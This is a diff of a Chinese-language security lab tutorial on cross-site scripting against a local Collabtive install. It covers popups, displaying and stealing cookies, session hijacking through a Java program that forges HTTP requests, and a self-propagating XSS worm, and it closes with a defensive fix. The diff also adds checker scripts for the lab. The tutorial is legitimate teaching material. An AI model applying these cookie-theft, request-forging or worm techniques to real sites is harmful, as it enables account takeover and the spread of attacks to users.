@@ -1,14 +1,22 @@
+---
+show: step
+version: 0.1
+enable_checker: true
+---
+
 # Collabtive系统跨站脚本攻击实验 
 
-## 实验简介 
+## 一、实验简介 
 
-**系统用户名seed，密码dees** 
+**`注意：进入实验需要等待一点时间才会出现界面，弹窗提示直接选择 use default config 按钮。`** 
 
 跨站点脚本(XSS)是一种常见的web应用程序漏洞,攻击者使用这个漏洞注入恶意代码(例如JavaScript)来攻击受害者的web浏览器。
 
 使用恶意代码,攻击者可以轻松窃取受害者的凭证,例如cookies。浏览器使用的保护措施会因为恶意代码拥有受害者的凭证而失效，因此这种漏洞会导致大规模的浏览器被利用。
 
-##预备知识 
+##二、预备知识 
+
+在开始之前我们先讲一些预备知识。
 
 ### 1、什么是XSS 
 
@@ -50,7 +58,7 @@ XSS(Cross Site Scripting)：跨站脚本攻击，它与SQL注入攻击类似，S
     sudo vim /etc/hosts
 ```
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156281821?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![2.5-1](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156281821?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 配置网站文件：
 
@@ -58,7 +66,7 @@ XSS(Cross Site Scripting)：跨站脚本攻击，它与SQL注入攻击类似，S
     sudo vim /etc/apache2/conf.d/lab.conf
 ```
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156311564?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![2.5-2](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156311564?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 
 启动服务：
@@ -71,9 +79,36 @@ XSS(Cross Site Scripting)：跨站脚本攻击，它与SQL注入攻击类似，S
 
 >用户名：**admin**；密码：**admin**
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156696473?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![2.5-3](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156696473?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
-## 实验内容 
+```checker
+- name: check hosts
+  script: |
+    #!/bin/bash
+    grep xsslabcollabtive /etc/hosts
+  error: 没有配置/etc/hosts文件
+- name: check lab.conf
+  script: |
+    #!/bin/bash
+    ls /etc/apache2/conf.d/lab.conf
+    grep xsslabcollabtive /etc/apache2/conf.d/lab.conf
+    grep Collabtive /etc/apache2/conf.d/lab.conf
+  error: 没有lab.conf文件或者没有配置lab.conf文件
+- name: check mysqld_safe
+  script: |
+    #!/bin/bash
+    ps -ef |grep -v grep|grep mysqld_safe
+  error: 没有启动mysqld_safe
+- name: check apache2
+  script: |
+    #!/bin/bash
+    ps -ef |grep -v grep|grep apache2
+  error: 没有启动apache2
+```
+
+## 三、实验内容 
+
+搭建好环境就开始进入到正式的实验步骤。
 
 ### lab1 通过弹窗显示恶意信息 
 
@@ -84,11 +119,11 @@ step1：新建一个js.html文件，获取弹框；弹框的目的是为了验�
     sudo vim js.html
 ```
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156723850?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.1-1](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156723850?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 访问测试：
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156736097?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.1-2](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156736097?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 
 step2：通过html调用js来获取弹框；这么做是为了有的时候，受害网站不允许直接写js代码，这个时候我们可以通过调用来检验是否存在xss漏洞
@@ -98,7 +133,7 @@ step2：通过html调用js来获取弹框；这么做是为了有的时候，受
     sudo vim myscript.js
 ```
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156755204?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.1-3](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156755204?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 这里要说明一下，当我们调用js文件的时候，js文件中不需要写`<script></script>`标签；
 
@@ -115,7 +150,31 @@ step2：通过html调用js来获取弹框；这么做是为了有的时候，受
 
 访问测试：
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156782625?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.1-4](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156782625?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+
+```checker
+- name: check js.html
+  script: |
+    #!/bin/bash
+    file_name="/var/www/XSS/Collabtive/js.html"
+    ls $file_name
+    grep alert $file_name
+  error: js.html不存在或者文件内容不对
+- name: check myscript.js
+  script: |
+    #!/bin/bash
+    file_name="/var/www/XSS/Collabtive/myscript.js"
+    ls $file_name
+    grep alert $file_name
+  error: myscript.js不存在或者文件内容不对
+- name: check include.html
+  script: |
+    #!/bin/bash
+    file_name="/var/www/XSS/Collabtive/include.html"
+    ls $file_name
+    grep xsslabcollabtive $file_name
+  error: include.html不存在或者文件内容不对
+```
 
 ### lab2 恶意显示Cookie 
 
@@ -127,13 +186,21 @@ step1：在`/var/www/XSS/Collabtive/manageuser.php`文件中添加一行，用�
     sudo vim manageuser.php
 ```
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156823580?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.2-1](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156823580?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 添加的这一行的功能就是以弹窗的形式显示用户的Cookie；
 
->效果：弹出来的就是我们当前用户的Cookie，我们可以使用httpliveHeader来抓取验证；
+>效果：弹出来的就是我们当前用户的Cookie，我们可以使用livehttpheaders来抓取验证；
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156839540?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.2-2](https://dn-simplecloud.shiyanlou.com/uid/8797/1524644925807.png-wm)
+
+```checker
+- name: check manageuser.php content
+  script: |
+    #!/bin/bash
+    grep "document.cookie" manageuser.php
+  error: manageuser.php 配置不对
+```
 
 ### lab3 窃取受害者的Cookie 
 
@@ -144,24 +211,49 @@ lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cook
 ```
     sudo vim hack.php
 ```
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156942831?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.3-1](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156942831?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 
 上面是获取cookie的代码，同时我们需要一个文件来接受cookie；在与hack.php文件同目录下新建一个cookie.txt用来接收cookie值；而且这个文件需要有写入权限；
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156915771?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.3-2](https://dn-simplecloud.shiyanlou.com/uid/8797/1524644416708.png-wm)
 
 然后我们在manageuser.php页面新增这样的语句，当用户访问这个页面时，用户就会把cookie发送到我们攻击者的手里：
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159671189?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.3-3](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159671189?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 受害者访问www.xsslabcollabtive.com/manageuser.php页面：
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159692468?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.3-4](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159692468?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 这个时候，攻击者在cookie.txt文件里面就获取了受害者的Cookie：
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159710028?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.3-5](https://dn-simplecloud.shiyanlou.com/uid/8797/1524644817511.png-wm)
+
+```checker
+- name: check hack.php
+  script: |
+    #!/bin/bash
+    file_name="/var/www/XSS/Collabtive/hack.php"
+    ls $file_name
+    grep cookie $file_name
+  error: hack.php不存在或者文件内容不对
+- name: check cookie.txt
+  script: |
+    #!/bin/bash
+    ls /var/www/XSS/Collabtive/cookie.txt
+  error: 指定目录下不存在 cookie.txt
+- name: check cookie.txt priv
+  script: |
+    #!/bin/bash
+    stat -c %a /var/www/XSS/Collabtive/cookie.txt|grep 777
+  error: cookie.txt 权限配置不对
+- name: check manageruser.php content
+  script: |
+    #!/bin/bash
+    grep "hack.php" /var/www/XSS/Collabtive/manageuser.php
+  error: manageusr.php 配置不对
+```
 
 ### lab4 使用获取的Cookie进行会话劫持 
 
@@ -171,7 +263,17 @@ lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cook
 
 首先：我们查看受害者创建项目时候的请求：
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159724192?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+这里使用的工具是之前提到的 `live http headers` 工具，点击浏览器的 tools-》add-ones ，在搜索框输入 live http header 就可以找到，点击 install 即可安装，安装后重启浏览器就可以了。我这里是已经安装了，截图如下：
+
+![3.4-1](https://dn-simplecloud.shiyanlou.com/uid/8797/1524647286699.png-wm)
+
+为避免之前登录过的影响，我们先清理一下浏览器历史，点击 History-》Clear Recent History ：
+
+![3.4-2](https://dn-simplecloud.shiyanlou.com/uid/8797/1524647662626.png-wm)
+
+然后点击浏览器 tools-》 live http headers，打开之前添加的工具。再输入 www.xsslabcollabtive.com 访问并登录。就可以在 live http headers 的窗口看到很多类似如下的内容。当然，你的显示内容跟我的有些地方可能不一样。
+
+![3.4-3](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159724192?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 当攻击者知道了创建项目的请求以后，就可以编写一个Java程序发送相同的HTTP请求达到创建项目的目的，当然还可以进行其他的请求：
 
@@ -185,7 +287,10 @@ lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cook
 
 >4、得到来自web服务器的响应。
 
-```
+在 /home/shiyanlou 目录下新建一个 HTTPSimpleForge.java 的文件，内容如下（**注意：根据你自己所得的 live http header 内容来，下面的代码需要变通** ）：
+
+
+```java
     import java.io.*;
     import java.net.*;
     public class HTTPSimpleForge {
@@ -194,7 +299,7 @@ lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cook
     int responseCode;
     InputStream responseIn=null;
     // URL to be forged.
-    URL url = new URL ("http://www.xsslabcollabtive/admin.php?action=addpro");
+    URL url = new URL ("http://www.xsslabcollabtive.com/admin.php?action=addpro");
     // URLConnection instance is created to further parameterize a
     // resource request past what the state members of URL instance
     // can represent.
@@ -229,7 +334,7 @@ lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cook
     // HTTP status code HTTP_OK means the response was
     // received sucessfully.
     if (responseCode == HttpURLConnection.HTTP_OK) {
-    Laboratory for Computer Security Education 6
+    //Laboratory for Computer Security Education 6
     // Get the input stream from url connection object.
     responseIn = urlConn.getInputStream();
     // Create an instance for BufferedReader
@@ -248,6 +353,9 @@ lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cook
     }
     }
 ```
+> - 使用 javac HTTPSimpleForge.java 编译文件
+> - 使用 java HTTPSimpleForge 运行程序
+
 ### lab5 XSS蠕虫 
 
 #### xss蠕虫 cross site scripting worm 
@@ -278,13 +386,13 @@ lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cook
     Ajax.send(content);
 ```
 
-我们创建一个test.js的文件；这个文件中是上面的Ajax框架：
+我们有一个test.js的文件；这个文件中是Ajax框架代码，我们可以使用下面的命令查看一下：
 
 ```
     sudo vim test.js
 ```
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159744204?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.5-1](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159744204?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 然后我们在创建一个test1.js的文件，写一个xss蠕虫代码：
 
@@ -292,7 +400,7 @@ lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cook
     sudo vim test1.js
 ```
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159761760?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.5-2](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159761760?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 这里是代码：
 
@@ -300,12 +408,12 @@ lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cook
     var on=new Ajax.PeriodicalUpdater("onlinelist",
     "manageuser.php?action=onlinelist",
     //定义一个新的Ajax.PeriodicalUpdater
-    {method:’get’,onSuccess:function(transport){alert(transport.responseText);},
+    {method:'get',onSuccess:function(transport){alert(transport.responseText);},
     frequence:1000}
     //请求方式为get，频率为1000
 ```
 
-上面的蠕虫代码不能够进行自动传播，这样达不到我们的需求；我们需要编写一个可以自动传播的xss蠕虫病毒，下面这段代码是蠕虫可以自动传播：
+上面的蠕虫代码不能够进行自动传播，这样达不到我们的需求；我们需要编写一个可以自动传播的xss蠕虫病毒的脚本，下面这段代码是蠕虫可以自动传播：
 
 ```
     <script id=worm>//定义js的id为worm
@@ -315,7 +423,7 @@ lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cook
     </script>
 ```
 
-代码中使用循环体，从而达到自动传播的目的。
+代码中使用循环体，从而达到自动传播的目的，具体操作如下：
 
 在实验机中这样创建xss蠕虫：
 
@@ -323,11 +431,9 @@ lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cook
 sudo vim xss_worm.js
 ```
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159804839?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
-
 
 ```
-    var strCode = document.getElementByld("worm");
+    var strCode = document.getElementById("worm");
 	alert(strCode.innerHTML);
 ```
 
@@ -337,7 +443,7 @@ sudo vim xss_worm.js
 sudo vim worm.html
 ```
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159819243?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.5-3](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159819243?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 ```
     <script type='text/javascript' src='http://www.xsslabcollabtive.com/xss_worm.js'></script>
@@ -351,16 +457,41 @@ sudo vim worm.html
 
 >XSS worm案例 [http://www.wooyun.org/bugs/wooyun-2013-017701](http://www.wooyun.org/bugs/wooyun-2013-017701 "点评网主站漏洞打包详解+手把手教你写xss蠕虫")
 
+```checker
+- name: check test1.js
+  script: |
+    #!/bin/bash
+    file_name="/var/www/XSS/Collabtive/test1.js"
+    ls $file_name
+    grep Ajax $file_name
+  error: test1.js不存在或者文件内容不对
+- name: check xss_worm
+  script: |
+    #!/bin/bash
+    file_name="/var/www/XSS/Collabtive/xss_worm.js"
+    ls $file_name
+    grep getElementById $file_name
+  error: xss_worm.js 不存在或者文件内容不对
+- name: check worm.html
+  script: |
+    #!/bin/bash
+    file_name="/var/www/XSS/Collabtive/worm.html"
+    ls $file_name
+    grep xss_worm $file_name
+  error: worm.html 不存在或者文件内容不对
+```
+
 ### lab6 XSS防御 
 
 简易代码防御xss漏洞：
 
 ```
-sudo vim inittucntions.php
+sudo vim /var/www/XSS/Collabtive/include/initfunctions.php
 ```
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159831667?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+定位到第 `170` 行的 getArrayVal 方法。
+![![img](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159842818?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)3.6-1](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159831667?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159842818?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.6-2](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159842818?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 
 **为什么**
